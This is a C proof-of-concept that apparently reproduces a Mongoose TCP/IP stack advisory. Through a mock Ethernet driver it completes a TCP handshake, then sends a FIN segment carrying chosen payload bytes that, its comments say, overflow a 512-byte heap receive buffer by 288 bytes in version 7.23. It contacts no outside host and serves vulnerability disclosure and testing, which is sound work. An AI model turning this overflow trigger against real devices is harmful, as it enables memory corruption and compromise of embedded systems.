// Local reproducer for GHSA-4mgp-8m9m-q872 / ZDI-CAN-29386.
// Drives the real Mongoose MIP stack through a mock L2 driver (pattern from
// upstream test/mip_test.c). No sockets, no root, no external host contact.
// Build: cc [-fsanitize=address] -DMG_IO_SIZE=512 -I <tree>/src poc.c -o poc
#define MG_ENABLE_TCPIP 1
#define MG_ENABLE_TCPIP_DRIVER_INIT 0

#include "mongoose.c"  // pulls in net_builtin.c, l2_eth.c, driver_mock.c

#define DPORT 80
#define SPORT 1
#define BUF_SIZE 2048
#define TCP_TEST_WIN 3000

struct driver_data {
  char buf[BUF_SIZE];
  size_t len;
  bool tx_ready;
};
static struct driver_data s_dd;

static size_t if_tx(const void *buf, size_t len, struct mg_tcpip_if *ifp) {
  (void) ifp;
  if (len > sizeof(s_dd.buf)) len = sizeof(s_dd.buf);
  memcpy(s_dd.buf, buf, len);
  s_dd.len = len;
  s_dd.tx_ready = true;
  return len;
}
static bool if_poll(struct mg_tcpip_if *ifp, bool s1) {
  (void) s1;
  return ifp->driver_data != NULL;  // always up: no 1s timer dependency
}
static size_t if_rx(void *buf, size_t len, struct mg_tcpip_if *ifp) {
  (void) ifp;
  if (s_dd.len == 0) return 0;
  if (len > s_dd.len) len = s_dd.len;
  memcpy(buf, s_dd.buf, len);
  s_dd.len = 0;
  s_dd.tx_ready = false;
  return len;
}

// Build one Ethernet/IPv4/TCP frame in s_dd.buf, ready for if_rx().
static void send_seg(struct eth *e, struct ip *ip, uint32_t seq, uint32_t ack,
                     uint8_t flags, const uint8_t *payload, size_t plen,
                     uint8_t fill) {
  struct tcp t;
  memset(&t, 0, sizeof(t));
  t.flags = flags;
  t.seq = mg_htonl(seq);
  t.ack = mg_htonl(ack);
  t.sport = mg_htons(SPORT);
  t.dport = mg_htons(DPORT);
  t.win = mg_htons(TCP_TEST_WIN);
  t.off = (uint8_t) ((sizeof(t) / 4) << 4);
  memset(s_dd.buf, 0, sizeof(s_dd.buf));
  memcpy(s_dd.buf, e, sizeof(*e));
  memset(ip, 0, sizeof(*ip));
  ip->ver = (4 << 4) | 5;
  ip->proto = 6;
  ip->src = mg_htonl(0x2000000);
  ip->dst = mg_htonl(0x1000000);
  ip->len = mg_htons((uint16_t) (sizeof(*ip) + sizeof(t) + plen));
  ip->csum = ipcsum(ip, sizeof(*ip));
  memcpy(s_dd.buf + sizeof(*e), ip, sizeof(*ip));
  struct tcp *tcp = (struct tcp *) (s_dd.buf + sizeof(*e) + sizeof(*ip));
  memcpy(tcp, &t, sizeof(t));
  unsigned char *p = (unsigned char *) s_dd.buf + sizeof(*e) + sizeof(*ip) + sizeof(t);
  for (size_t i = 0; i < plen; i++) p[i] = fill;
  ip->csum = 0;
  tcp->csum = pcsum(ip, tcp, sizeof(t) + plen);
  s_dd.len = sizeof(*e) + sizeof(*ip) + sizeof(t) + plen;
  if (s_dd.len < 64) s_dd.len = 64;  // minimum Ethernet frame
}

static void noop_fn(struct mg_connection *c, int ev, void *ev_data) {
  (void) c, (void) ev, (void) ev_data;  // leave 400 bytes in c->recv
}

int main(int argc, char **argv) {
  bool attack = argc < 2 || strcmp(argv[1], "attack") == 0;
  struct mg_mgr mgr;
  struct mg_tcpip_if mif;
  struct eth e;
  struct ip ip;
  struct mg_tcpip_driver driver;


  memset(&mif, 0, sizeof(mif));
  memset(&s_dd, 0, sizeof(s_dd));
  driver.init = NULL;
  driver.tx = if_tx;
  driver.rx = if_rx;
  driver.poll = if_poll;
  mif.driver = &driver;
  mif.driver_data = &s_dd;
  mif.ip = mg_htonl(0x1000000);
  mif.gw = mg_htonl(0x1000000);
  mif.gw_ready = true;
  mif.mask = mg_htonl(0xff000000);
  mif.state = MG_TCPIP_STATE_READY;
  mg_tcpip_init(&mgr, &mif);
  mg_http_listen(&mgr, "http://0.0.0.0:80", noop_fn, NULL);
  mgr.conns->pfn = NULL;  // skip HTTP parsing; MIP/TCP is the subject
  mg_mgr_poll(&mgr, 0);

  memset(&e, 0, sizeof(e));
  memcpy(e.dst, mif.mac, 6);
  e.type = mg_htons(0x0800);
  ip.src = mg_htonl(0x2000000);
  ip.dst = mif.ip;

  // Three-way handshake: SYN -> SYN+ACK -> ACK.
  send_seg(&e, &ip, 1000, 0, TH_SYN, NULL, 0, 0);
  mg_mgr_poll(&mgr, 0);
  int spins = 0;
  struct tcp *t = (struct tcp *) (s_dd.buf + sizeof(e) + sizeof(ip));
  while (!s_dd.tx_ready && spins++ < 1000) mg_mgr_poll(&mgr, 0);
  if (!s_dd.tx_ready || t->flags != (TH_SYN | TH_ACK)) {
    printf("HANDSHAKE_FAIL flags=%u spins=%d\n", t->flags, spins);
    return 2;
  }
  uint32_t server_seq = mg_ntohl(t->seq);
  uint32_t server_ack = mg_ntohl(t->ack);
  send_seg(&e, &ip, 1001, server_seq + 1, TH_ACK, NULL, 0, 0);
  mg_mgr_poll(&mgr, 0);
  (void) server_ack;

  // 400 bytes of normal data: alloc/grow c->recv to 512 bytes (MG_IO_SIZE).
  uint8_t normal[400], finpay[400];
  memset(normal, 'A', sizeof(normal));
  memset(finpay, 0x5a, sizeof(finpay));  // chosen overflow bytes
  send_seg(&e, &ip, 1001, server_seq + 1, TH_PUSH | TH_ACK, normal,
           sizeof(normal), 'A');
  mg_mgr_poll(&mgr, 0);
  if (mgr.conns == NULL) {
    printf("CONN_LOST\n");
    return 2;
  }
  size_t recv_size = mgr.conns->recv.size, recv_len = mgr.conns->recv.len;
  printf("BEFORE_FIN recv_size=%lu recv_len=%lu\n",
         (unsigned long) recv_size, (unsigned long) recv_len);

  // FIN carrying payload: vulnerable 7.23 skips the resize check and writes
  // 400 bytes at offset 400 => 288 bytes past the 512-byte allocation.
  size_t paylen = attack ? sizeof(finpay) : 112;  // safe: fits in 512
  send_seg(&e, &ip, 1401, server_seq + 1, TH_FIN | TH_ACK, finpay, paylen,
           0x5a);
  mg_mgr_poll(&mgr, 0);
  printf("AFTER_FIN mode=%s recv_len=%lu\n", attack ? "attack" : "safe",
         (unsigned long) mgr.conns->recv.len);
  if (attack) {
    unsigned char *b = (unsigned char *) mgr.conns->recv.buf;
    printf("OVF_BYTES off400=%02x off520=%02x off799=%02x\n", b[400], b[520],
           b[799]);
  }
  mg_mgr_free(&mgr);
  return 0;
}
